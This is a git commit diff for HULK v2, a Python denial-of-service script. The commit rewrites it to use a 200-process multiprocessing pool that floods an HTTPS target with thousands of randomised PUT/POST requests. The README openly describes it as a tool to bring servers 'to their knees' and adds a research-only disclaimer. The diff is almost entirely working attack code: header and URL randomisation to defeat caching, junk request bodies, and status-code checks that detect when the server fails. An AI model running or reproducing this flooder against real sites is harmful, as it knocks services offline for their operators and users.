2d1f6c006ab8cf8eb92b3e4a0297166c76f9723b
Harshith Thota <harshith.thota7@gmail.com>
2017-07-13 08:05:25 +0530

    Multiprocessing Achieved! (#1)
    * Update hulk.py
    
    * Update README.md
    
    * Update README.md
    
    * Update README.md

--- README.md
+++ README.md
@@ -1,17 +1,23 @@
 # HULK v2 - HTTPS Unbearable Load King
+-----------------------------------------------------------------------------------------------
+## Introduction:
 
- This script is a Denial of Service tool that is can put heavy load on HTTPS servers,
- in order to bring them to their knees, by exhausting the resource pool.
- Its is meant for research purposes only and any malicious usage of this tool is prohibited.
- The authors aren't to be held responsible for any consequence of usage of this tool.
+ > This script is a *Denial of Service* tool that can put heavy load on HTTPS servers,
+ > in order to bring them to their knees, by exhausting the resource pool.
+ > Its is meant for research purposes only and any malicious usage of this tool is prohibited.
+ > **The authors aren't to be held responsible for any consequence of usage of this tool.**
 
-# Edited and improved by Hyperclaw79 for smoother working and PY3+ compatibility.
+ Authors : **Hyperclaw79**, *version 2.0*; **Barry Shteiman** , *version 1.0*
 
-# Works for Python 3.5. No backward compatiblity.
+ ### Notes: 
+     * Edited and improved by Hyperclaw79 for smoother working and PY3+ compatibility.
+     * Works for Python 3.5. No backward compatiblity.
+ 
+ Run `pip install -r requirements.txt` before starting this script.
 
-# Run pip install -r requirements.txt before starting this script.
+-----------------------------------------------------------------------------------------------
 
-# Edits: 
+## Edits: 
         1)Syntax Corrections.
         2)Replaced urllib2 module with requests module.
         3)Replaced support for Http with support for Https.
@@ -19,11 +25,15 @@
         5)Randomized buildblock size a bit more.
         6)Deprecated 'safe'.
         7)Improved Documentation.
+        8)Payload Obfuscation.
+        9)Converted global variables to class variables.
+        10)Replaced Threading with Multiprocessing.
+        11)Introduced Shared Memory for interprocess communication. 
+        12)Performed other performance tweaks.
 
-# Authors : Hyperclaw79, version 2.0; Barry Shteiman , version 1.0
+-------------------------------------------------------------------------------------------------
+## License
 
----------------------------------------------------------------------
-
-HULK v2 is a Python 3 compatible Denial of Service Script. Original script was created by Barry Shteiman. You can use that one if you have Python 2. Here's the link: http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/ 
+HULK v2 is a Python 3 compatible Denial of Service Script. Original script was created by Barry Shteiman. You can use that one if you have Python 2. Here's the [link:] (http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/) 
 
 Using a GNU license cause there was no mention about any license used by Barry. Feel free to modify and share it, but leave some credits to us both and don't hold us liable.
--- hulk.py
+++ hulk.py
@@ -1,215 +1,176 @@
-# -------------------------------------------------------------------------------------------- #
-# HULK v2 - HTTPS Unbearable Load King
-#
-# This script is a Denial of Service tool that is can put heavy load on HTTPS servers,
-# in order to bring them to their knees, by exhausting the resource pool.
-# Its is meant for research purposes only and any malicious usage of this tool is prohibited.
-# The authors aren't to be held responsible for any consequence of usage of this tool.
-#
-# Edited and improved by Hyperclaw79 for smoother working and PY3+ compatibility.
-#
-# Works for Python 3.5. No backward compatiblity.
-#
-# Run pip install -r requirements.txt before starting this script.
-#
-# Edits: 1)Syntax Corrections.
-#        2)Replaced urllib2 module with requests module.
-#        3)Replaced support for Http with support for Https.
-#        4)Added more HTTP Status Error Codes for detection and control.
-#        5)Randomized buildblock size a bit more.
-#        6)Deprecated 'safe'.
-#        7)Improved Documentation.
-#        8)Added Threadpooling.
-#        9) Payload Obfuscation.
-#
-# Authors : Hyperclaw79, version 2.0; Barry Shteiman , version 1.0
-# -------------------------------------------------------------------------------------------- #
-
 import requests               # Because it's faster and more powerful than urllib2
 import sys
 import threading
 import random
 import re
 import time                   # For time.sleep
+import multiprocessing
+import ctypes
 
-from queue import Queue
-
-# Global Params
-global urlc
-urlc=''                       # To prevent conflict with url keyword of requests module  
-host=''
-headers_useragents=[]
-headers_referers=[]
-global request_counter
-request_counter=0
-flag=0
-q = Queue()
-global dt
-dt = []
-global status
-status = ""
-global fault
-fault = 0
-
-def inc_counter():
-	global request_counter
-	request_counter+=1
-
-def set_flag(val):
-	global flag
-	flag=val
-
-def set_safe():
-	global safe
-	safe=1
-	
-# Generates a List of UserAgent headers.
-def useragent_list():
-	global headers_useragents
-	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
-	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-	return(headers_useragents)
-
-# Generates a List of Referer headers.
-def referer_list():
-	global headers_referers
-	headers_referers.append('https://www.google.com/?q=')
-	headers_referers.append('https://www.usatoday.com/search/results?q=')
-	headers_referers.append('https://engadget.search.aol.com/search?q=')
-	headers_referers.append('https://' + host + '/')
-	return(headers_referers)
-	
+from multiprocessing import Pool
+    
 # Generates random ascii string of given size.
 def buildblock(size):
-	out_str = ''
-	for i in range(size):
-		a = random.randint(65, 90)
-		out_str += chr(a)
-	return(out_str)
+    out_str = ''
+    for i in range(size):
+        a = random.randint(65, 90)
+        out_str += chr(a)
+    return out_str
 
 # User Instructions
 def usage():
-	print('---------------------------------------------------')
-	print('USAGE: python hulk.py <url>')
-	print('Example: python hulk.py https://abcxyz123.com')
-	print('---------------------------------------------------')
+    print('---------------------------------------------------')
+    print('USAGE: python hulk.py <url>')
+    print('Example: python hulk.py https://abcxyz123.com')
+    print('---------------------------------------------------')
 
-def corrupt():		
-	for i in range(500):
-		dt.append(buildblock(random.randint(1,10)) + '\a' + buildblock(random.randint(1,10)))
-	
+def init(ctr,sts,fg,flt):
+    global counter,status,flag,fault
+    counter = ctr
+    status =sts
+    flag = fg
+    fault = flt
+
+# Class vars
+
+class Param_Class():
+
+#Initialisation.
+    def __init__(self):
+        self.headers_useragents=[]
+        self.headers_referers=[]
+        self.dt = []
+        self.urlc = sys.argv[1]
+        if self.urlc.count("/")==2:
+            self.urlc +=  "/"
+            m = re.search('https\://([^/]*)/?.*', self.urlc)  
+            self.host = m.group(1)
+        else:
+            self.host = ""
+
+    def set_flag(self,val):
+        flag.value=val
+        
+    def set_status(self,val):
+        status[:]=val
+        
+    def inc_counter(self):
+        counter.value+=1
+        
+    def inc_fault(self):
+        fault.value+=1
+        
+    
+# Generates a List of UserAgent headers.
+    def useragent_list(self):
+        self.headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
+        self.headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+        self.headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+        self.headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
+        self.headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
+        self.headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
+        self.headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
+        self.headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
+        self.headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
+        self.headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
+        self.headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
+        self.headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
+        return self.headers_useragents
+
+# Generates a List of Referer headers.
+    def referer_list(self):
+        self.headers_referers.append('https://www.google.com/?q=')
+        self.headers_referers.append('https://www.usatoday.com/search/results?q=')
+        self.headers_referers.append('https://engadget.search.aol.com/search?q=')
+        self.headers_referers.append('https://' + param_class.host + '/')
+        return self.headers_referers
+
+#Generates arbitrary data.
+    def corrupt(self):
+        for i in range(5000):
+            self.dt.append(buildblock(random.randint(1,3)) + random.choice(['\a','\n','\t','\b','\r','\f']) + buildblock(random.randint(1,3)))
+        
+param_class = Param_Class()
+
 # Main Function that sends a HTTPS request.
-def httpcall(urlc):
-	useragent_list()
-	referer_list()
-	code=0
-	global request_counter
-	global fault
-	global status
-	global dt
-	
-	if urlc.count("?")>0:          # For Quering type urls
-		param_joiner="&"
-	else:
-		param_joiner="?"
+def attacker(num):
+    param_class.useragent_list()
+    param_class.referer_list()
+    param_class.inc_counter()
+    code=0
+    urlc = param_class.urlc 
+    if urlc.count("?")>0:          # For Quering type urls
+        param_joiner="&"
+    else:
+        param_joiner="?"
 
-	HeaderDict = {'User-Agent': random.choice(headers_useragents),'Cache-Control': 'no-cache','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7','Referer': random.choice(headers_referers) + buildblock(random.randint(random.randint(0,5),random.randint(6,10))),'Keep-Alive': str(random.randint(110,120)),'Connection': 'keep-alive','Host':host}
-	urlreq = urlc + param_joiner + buildblock(random.randint(random.randint(0,3),random.randint(4,10))) + '=' + buildblock(random.randint(random.randint(0,3),random.randint(4,10)))
+    HeaderDict = {'User-Agent': random.choice(param_class.headers_useragents),'Cache-Control': 'no-cache','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7','Referer': random.choice(param_class.headers_referers) + buildblock(random.randint(random.randint(0,5),random.randint(6,10))),'Keep-Alive': str(random.randint(110,120)),'Connection': 'keep-alive','Host':param_class.host}
+    urlreq = urlc + param_joiner + buildblock(random.randint(random.randint(0,3),random.randint(4,10))) + '=' + buildblock(random.randint(random.randint(0,3),random.randint(4,10)))
+    try:
+        try:
+            r = requests.put(url=urlreq,headers=HeaderDict,data=param_class.dt[num],timeout=(15,30))
+        except:
+            r = requests.post(url=urlreq,headers=HeaderDict,data=param_class.dt[num],timeout=(15,30))
+        if (str(r.status_code)=='500') or (str(r.status_code)=='503') or (str(r.status_code)=='504'):
+            param_class.set_flag(1)
+            print('Successful.')
+            code=500
+        elif str(r.status_code)=='400':
+            print('Url has DDoS protection.')
+            sys.exit()
+        elif str(r.status_code)=='404':
+            print('Url does not exist.')
+            sys.exit()
+        elif str(r.status_code)=='429':
+            print('Slowing down due to "Too many requests" error.',flush=True)
+            time.sleep(20)
+        elif str(r.status_code)=='405':
+            r = requests.get(url=urlreq,headers=HeaderDict,timeout=(15,30))
+        elif ("30" in str(r.status_code)) or ("40" in str(r.status_code)) or ("50" in str(r.status_code)):       # For other unexpected HTTPS errors, prints the error code. 
+            print(str(r.status_code))
+        elif counter.value >= 5000:
+            code = "Done"
+        else:
+            print('Sending crafted request: %s' % urlreq,flush=True)
+                
+    except Exception as e:
+        print(str(e))
+        param_class.inc_fault()
+    return(code)        
 
-	try:
-		try:
-			r = requests.put(url=urlreq,headers=HeaderDict,data=dt[request_counter],timeout=(15,30))
-		except:
-			r = requests.post(url=urlreq,headers=HeaderDict,data=dt[request_counter],timeout=(15,30))
+# Handler for attacker. 
+def handler(i):
+    param_class.corrupt()
+    if i<5000+fault.value:
+        if flag.value<2:
+            code = attacker(i)
+            if code==500:
+                param_class.set_flag(2)
+                param_class.set_status("successly. ")
+            print("%d Requests Sent" % counter.value,flush=True)
 
-		if (str(r.status_code)=='500') or (str(r.status_code)=='503') or (str(r.status_code)=='504'):
-			set_flag(1)
-			print('Successful.')
-			code=500
-		elif str(r.status_code)=='400':
-			print('Url has DDoS protection.')
-			sys.exit()
-		elif str(r.status_code)=='404':
-			print('Url does not exist.')
-			sys.exit()
-		elif str(r.status_code)=='429':
-			print('Slowing down due to "Too many requests" error.')
-			time.sleep(5)
-		elif ("30" in str(r.status_code)) or ("40" in str(r.status_code)) or ("50" in str(r.status_code)):       # For other unexpected HTTPS errors, prints the error code. 
-			print(str(r.status_code))
-		elif request_counter >= 500:
-			code = "Done"
-		else:
-			print('Sending crafted request: %s' % urlreq,flush=True)
-			inc_counter()
-			
-	except Exception as e:
-		print(str(e))
-		request_counter-=1
-		fault+=1
+# Launcher. 
+if __name__ == "__main__":  
 
-	return(code)		
+    if len(sys.argv) < 2:
+        usage()
+        sys.exit()
+    else:
+        if sys.argv[1]=="help":
+            usage()
+            sys.exit()
+        else:
+            print("-- HULK Attack Started --")
+            print("Current Version: 2.3")
+            print("Compatible with: Python 3")
+            print("Edited by: Hyperclaw79")
 
-# Queueing Threads to work with httpcall. 
-def dosExec():
-	while flag<2:
-		urlc = q.get()
-		code = httpcall(urlc)
-		if code==500:
-			set_flag(2)
-			status="successly. "
-			q.task_done()
-			return
-		elif code == "Done":
-			set_flag(2)
-			status="but failed. "
-			q.task_done()
-			return
-		q.task_done()
-		print("%d Requests Sent" % request_counter,flush=True)
-	return
-
-# Main code. 
-if len(sys.argv) < 2:
-	usage()
-	sys.exit()
-else:
-	if sys.argv[1]=="help":
-		usage()
-		sys.exit()
-	else:
-		print("-- HULK Attack Started --")
-		print("Current Version: 2.1")
-		print("Compatible with: Python 3")
-		print("Edited by: Hyperclaw79")
-		urlc = sys.argv[1]
-		if urlc.count("/")==2:
-			urlc = urlc + "/"
-		m = re.search('https\://([^/]*)/?.*', urlc)  
-		host = m.group(1)
-		corrupt()
-		for i in range(500+fault):
-			t = threading.Thread(target=dosExec)
-			t.daemon = True
-			t.start()
-
-		count = 0
-		for i in range(500+fault):
-			q.put(urlc)
-			count+=1
-			if count == 250:
-				time.sleep(0.1)
-				count = 0
-			
-		q.join()
-		print("\n-- HULK v2.1 Attack Finished %s--" % status)
+            counter = multiprocessing.Value('i',0)
+            status = multiprocessing.Array(ctypes.c_wchar_p,' but failed.')
+            flag = multiprocessing.Value('i',0)
+            fault = multiprocessing.Value('i',0)
+            p = Pool(processes=200,initializer=init, initargs=(counter,status,flag,fault))
+            p.map_async(handler,range(5000+fault.value))
+            p.close()
+            p.join()
+            print("\n-- HULK v2 Attack Finished %s--" % ''.join(status[:]))
